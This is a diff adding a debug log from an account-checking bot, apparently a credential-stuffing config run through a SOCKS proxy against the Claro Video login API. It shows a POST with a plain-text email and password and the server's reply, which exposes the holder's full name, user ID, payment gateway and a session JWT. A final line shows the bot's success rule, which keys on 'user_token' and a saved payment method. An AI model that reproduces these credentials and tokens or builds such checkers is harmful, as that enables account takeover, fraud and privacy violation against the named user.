@@ -1,0 +1,45 @@
+-----------------------------------------
+Site: https://mfwktabletandroid-api.clarovideo.net/services/user/login?device_type=SM-G930F&device_id=13913755&api_version=v5.82&device_category=tablet&device_manufacturer=samsung&device_so=Android%205.1.1&region=mexico&authpt=12e4i8l6a581a&device_model=android&HKS=bts234uivrn373h8gk96r3sa37&authpn=amco&format=json&includpaywayprofile=1
+Debug of BOT 182
+Socks: 64.118.87.19
+-----------------------------------------
+<-----Received Source----->
+Fake Socket Stage
+
+<-----Bot Status: Variables computed successfully -> Posting----->
+<-----Sent Headers----->
+POST /services/user/login?device_type=SM-G930F&device_id=13913755&api_version=v5.82&device_category=tablet&device_manufacturer=samsung&device_so=Android%205.1.1&region=mexico&authpt=12e4i8l6a581a&device_model=android&HKS=bts234uivrn373h8gk96r3sa37&authpn=amco&format=json&includpaywayprofile=1 HTTP/1.1
+Accept: */*
+User-Agent: AndroidDlaApk AndroidDlaApkAccedo
+Host: mfwktabletandroid-api.clarovideo.net
+Pragma: no-cache
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Cookie: PHPSESSID=bts234uivrn373h8gk96r3sa37; Max-Age=5184000
+x-newrelic-id: UgECVVNRGwUDVFFbDgQ=
+Post Data:
+username=ferfierro@hotmail.com&password=296792
+
+<-----Received Headers----->
+HTTP/1.1 200 OK
+Content-Type: text/json; charset=utf-8
+Server: nginx/1.6.2
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Authorization
+Access-Control-Allow-Origin: *
+X-NewRelic-App-Data: PxQBVlNXDQETVVVQAgYPUVAEFB9AMQYAZBBZDEtZV0ZaClc9HiJGERBZWj1JEF1BRg0CB0RtGBMXVERvTQoMBVkMGk4IFgQCA1UJTQFPBVZUBQNNS1IUEQQBVVtSUwQDVFQEA1JfVQcSTl4DVEtRbw==
+X-server-addr: 10.11.128.196
+Expires: Tue, 11 Sep 2018 16:55:29 GMT
+Cache-Control: max-age=0, no-cache, no-store
+Pragma: no-cache
+Date: Tue, 11 Sep 2018 16:55:29 GMT
+Content-Length: 2149
+Connection: keep-alive
+Set-Cookie: PHPSESSID=bts234uivrn373h8gk96r3sa37; expires=Sat, 10-Nov-2018 16:55:28 GMT; Max-Age=5184000; path=/
+Akamai-Host: mfwktabletandroid-api.clarovideo.net
+
+<-----Received Source----->
+{"entry":{"device_type":"SM-G930F","device_id":"13913755","api_version":"v5.82","device_category":"tablet","device_manufacturer":"samsung","device_so":"Android 5.1.1","region":"mexico","authpt":"12e4i8l6a581a","device_model":"android","HKS":"bts234uivrn373h8gk96r3sa37","authpn":"amco","format":"json","includpaywayprofile":"1","username":"ferfierro@hotmail.com","password":"296792","cache":"all"},"response":{"user_id":"2793092","username":"ferfierro@hotmail.com","email":"ferfierro@hotmail.com","firstname":"RAUL FERNANDO","lastname":"FIERRO GOMEZ","country_code":"MX","region":"mexico","session_servername":"10.11.128.196","session_stringvalue":"(bts234uivrn373h8gk96r3sa37)","session_parametername":"HKS","session_userhash":"Mjc5MzA5MnwxNTM2Njg0OTI5fGYwYzc4NGYwNDYwYzY4YjU2ZmQwNDFmYmI4NDc1ZTU5NDYwOTEzYzQ3M2FjNGU1NTM0","language":"ES","status":"success","newWorkflow":1,"lasttouch":{"seen":"5b97f3810b02f","favorited":"5b97f3810ba90","purchased":"5b97f3810c2b5"},"accepted_terms":1,"superhighlight":["no_susc","no_suscripto_amco","no_suscripto_fox","no_suscripto_hbo","no_suscripto_crackle","no_suscripto_noggin"],"subscriptions":[],"paymentMethods":{"telmexmexicogate":true},"hasSavedPayway":1,"hasUserSusc":0,"socialNetworks":[{"id_usuario":"2793092","id_usuario_social":"599a6d3da7b01c7d3213c211","redsocial":"IMUSICA","extra_data":null}],"gamification_id":"599a6d3da7b01c7d3213c211","paywayProfile":{"subscriptions":[],"paymentMethods":[{"gateway":"telmexmexicogate","gateway_text":"TEXT_PGS_PAYMENT_MEXICO_GATEWAY_TELMEXMEXICOGATE","status":"VALID","user_category":"PQT01"}]},"counterValidEmail":0,"validEmail":true,"user_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1MzY2ODQ5MjksImV4cCI6MTU0MTg2ODkyOSwidXNyIjp7InVzZXJfaWQiOiIyNzkzMDkyIiwidXNlcm5hbWUiOiJmZXJmaWVycm9AaG90bWFpbC5jb20iLCJlbWFpbCI6ImZlcmZpZXJyb0Bob3RtYWlsLmNvbSIsImZpcnN0bmFtZSI6IlJBVUwgRkVSTkFORE8iLCJsYXN0bmFtZSI6IkZJRVJSTyBHT01FWiIsImNvdW50cnlfY29kZSI6Ik1YIiwicmVnaW9uIjoibWV4aWNvIiwiYWNjZXB0ZWRfdGVybXMiOjEsImdhbWlmaWNhdGlvbl9pZCI6IjU5OWE2ZDNkYTdiMDFjN2QzMjEzYzIxMSIsImFjY291bnQiOm51bGx9fQ.LaLv56QUa1hh3ipZYTt__7mZXgpALC40cQ5gkjN4V84"},"status":"0","msg":"OK"}
+<-----Bot Status: Success Source Keyword Match -> Found Key ["user_token"] and Found Key ["hasSavedPayway":1] - Source Length: 2149 - Found data to capture: Pais: MX, Estado del Pago: VALID Crada por JONATHAN GERONIMO +LORD CONFIG+ squad----->
